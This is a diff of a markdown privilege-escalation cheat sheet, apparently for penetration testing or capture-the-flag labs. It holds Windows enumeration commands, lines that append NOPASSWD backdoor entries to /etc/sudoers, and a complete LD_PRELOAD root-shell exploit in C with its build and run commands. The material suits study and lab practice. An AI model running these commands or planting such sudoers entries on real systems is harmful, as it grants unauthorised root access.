@@ -1,3 +1,4 @@
+# Windows
 ### Powershell to search file recursively and silently
 ```
 Get-ChildItem -Path "C:\" -Include user.txt -Recurse -File -ErrorAction SilentlyContinue -Force
@@ -25,8 +26,7 @@ net group "group name" /domain
 ##### check the created owner of folder
 ```
 Get-ACL <FolderPath> | Select-Object Owner
-```
-### Windows
+``` 
 ##### LOLBAS
 https://lolbas-project.github.io/#  
 (similar to gtfobins)
@@ -589,7 +589,7 @@ Basic.exe pid of process run by root(tasklist /FO TABLE /NH)
 compile AdvancedProcessInjection.cpp
 AdvancedProcessInjection.exe pid
 ```
-### Linux
+# Linux
 ###### Directory Permissions
 >A directory is handled differently from a file. Read access gives the right to consult the list of its contents (files and directories). Write access allows creating or deleting files. Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example).
 ###### Check what sudo permissions the user has available to them
@@ -744,13 +744,16 @@ openssl passwd -1 -salt hack password123
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-###### LD_PRELOAD and NOPASSWD
-If LD_PRELOAD is explicitly defined in the sudoers file
+### LD_PRELOAD and NOPASSWD
+
 ```
-Defaults        env_keep += LD_PRELOAD
+If LD_PRELOAD is explicitly defined in the sudoers file or sudo -l
+
+env_keep += LD_PRELOAD
+```
 ```
 Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-```
+
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -761,8 +764,10 @@ void _init() {
     setuid(0);
     system("/bin/sh");
 }
+
+sudo LD_PRELOAD=/tmp/shell.so find
 ```
-Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find
+
 ###### Sudo Inject
 ```
 $ sudo whatever
